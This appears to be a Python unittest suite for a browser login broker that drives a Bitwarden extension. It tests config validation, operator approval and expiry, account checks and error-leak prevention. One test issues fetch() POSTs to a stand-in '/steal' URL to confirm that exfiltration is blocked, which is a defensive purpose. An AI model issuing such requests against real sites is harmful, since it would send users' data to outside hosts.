"""Test native control-plane guards with real DOM; the CI verifier tests crypto."""

import json
import secrets
import tempfile
import unittest
from pathlib import Path
from types import SimpleNamespace
from unittest.mock import patch

from browser_broker import BrokerError, BrowserBroker, validate_config


def native_config():
    return {
        "provider": "bitwarden-extension",
        "extension_path": "/opt/vaultwarden-agent/extensions/bitwarden",
        "profile_path": "/run/vaultwarden-agent/profile",
        "sites": {
            "example": {
                "login_url": "https://login.example.test/login",
                "passkey_selector": "#passkey",
                "success_path": "/account",
                "success_selector": "#success",
                "account_selector": "meta[name=login][content=operator]",
                "resource_origins": ["https://assets.example.test"],
            }
        },
    }


class NativeConfigTests(unittest.TestCase):
    def test_native_config_contains_no_vault_credentials(self):
        validate_config(native_config())
        for change in [
            {"user_key": "not_allowed"},
            {"agent_token": "not_allowed"},
            {"profile_path": "relative"},
        ]:
            config = native_config()
            config.update(change)
            with self.assertRaises(BrokerError):
                validate_config(config)
        config = native_config()
        config["sites"]["second"] = dict(config["sites"]["example"])
        with self.assertRaises(BrokerError):
            validate_config(config)

    def test_untrusted_site_profiles_fail_closed(self):
        for change in [
            {"login_url": "http://login.example.test/login"},
            {"login_url": "https://login.example.test/?token=private"},
            {"success_path": "/account?token=private"},
            {"resource_origins": ["http://assets.example.test"]},
        ]:
            config = native_config()
            config["sites"]["example"].update(change)
            with self.assertRaises(BrokerError):
                validate_config(config)


class NativeBrowserTests(unittest.IsolatedAsyncioTestCase):
    async def asyncSetUp(self):
        from playwright.async_api import async_playwright

        self.engine = await async_playwright().start()
        self.browser = await self.engine.chromium.launch(
            headless=True, chromium_sandbox=True
        )
        self.context = await self.browser.new_context(service_workers="block")
        self.broker = BrowserBroker(native_config())
        self.broker.browser = self.browser
        self.broker.native_context = self.context
        self.broker.native_extension_origin = "https://provider.example.test"
        self.account = "operator"

        async def route(actual):
            async def fulfill():
                if actual.request.url.startswith(self.broker.native_extension_origin):
                    await actual.fulfill(
                        content_type="text/html",
                        body='<input id="masterPassword" type="password">',
                    )
                    return
                await actual.fulfill(
                    content_type="text/html",
                    body=f'<button id="passkey">Sign in</button><div id="success">Private account</div><meta name="login" content="{self.account}">',
                )

            await self.broker._native_route(
                SimpleNamespace(
                    request=actual.request, continue_=fulfill, abort=actual.abort
                )
            )

        await self.context.route("**/*", route)

    async def asyncTearDown(self):
        await self.broker.close()
        await self.browser.close()
        await self.engine.stop()

    async def test_pending_approval_and_verified_account_session(self):
        with patch.object(
            self.broker,
            "_credentials",
            side_effect=AssertionError("native_must_not_read_fill_secrets"),
        ):
            self.assertEqual(
                (await self.broker.login("example"))["status"], "needs_approval"
            )
        self.assertEqual(
            (await self.broker.status("example"))["status"], "needs_approval"
        )
        operator = await self.context.new_page()
        await operator.goto(self.broker.native_extension_origin + "/confirmation")
        await self.broker._watch_native_verification(operator)
        page = self.broker.sessions["example"][1]
        await page.goto("https://login.example.test/account")
        self.assertEqual(
            (await self.broker.status("example"))["status"], "authenticated"
        )
        self.assertEqual(
            (await self.broker.login("example"))["status"], "authenticated"
        )
        self.assertEqual(
            (await self.broker.login("unapproved"))["status"], "site_not_allowed"
        )

    async def test_wrong_account_does_not_pass_and_approval_expires(self):
        self.account = "other-account"
        await self.broker.login("example")
        await self.broker.sessions["example"][1].goto(
            "https://login.example.test/account"
        )
        self.assertEqual(
            (await self.broker.status("example"))["status"], "needs_approval"
        )
        self.broker.pending["example"] = 0
        result = await self.broker.status("example")
        self.assertEqual(result["reason"], "approval_expired")
        self.assertFalse(self.broker.sessions)

    async def test_account_marker_without_provider_verification_is_rejected(self):
        await self.broker.login("example")
        await self.broker.sessions["example"][1].goto(
            "https://login.example.test/account"
        )
        result = await self.broker.status("example")
        self.assertEqual(result["reason"], "provider_verification_unconfirmed")
        self.assertFalse(self.broker.sessions)

    async def test_late_confirmation_cannot_bypass_approval_expiry(self):
        await self.broker.login("example")
        self.broker.native_verified.add("example")
        self.broker.pending["example"] = 0
        await self.broker.sessions["example"][1].goto(
            "https://login.example.test/account"
        )
        self.assertEqual(
            (await self.broker.status("example"))["reason"], "approval_expired"
        )
        self.assertFalse(self.broker.sessions)

    async def test_reflected_native_errors_never_cross_boundary(self):
        await self.broker.login("example")
        sentinel = secrets.token_urlsafe(40)
        with patch.object(
            self.broker, "_native_status", side_effect=RuntimeError(sentinel)
        ):
            result = await self.broker.login("example")
        self.assertEqual(result["reason"], "native_login_unconfirmed")
        self.assertNotIn(sentinel, json.dumps(result))

    async def test_unapproved_fetch_and_cdn_post_are_blocked(self):
        await self.broker.login("example")
        page = self.broker.sessions["example"][1]
        for url in [
            "https://unapproved.example.test/steal",
            "https://assets.example.test/steal",
        ]:
            blocked = await page.evaluate(
                "url => fetch(url, {method:'POST', body:'synthetic'}).then(()=>false,()=>true)",
                url,
            )
            self.assertTrue(blocked)

    async def test_mutable_extension_is_rejected_before_provider_start(self):
        with tempfile.TemporaryDirectory() as root:
            extension = Path(root) / "extension"
            extension.mkdir(mode=0o777)
            broker = BrowserBroker(
                {
                    **native_config(),
                    "extension_path": str(extension),
                }
            )
            with self.assertRaisesRegex(BrokerError, "trusted_native_files_required"):
                await broker._start_native()


if __name__ == "__main__":
    unittest.main()
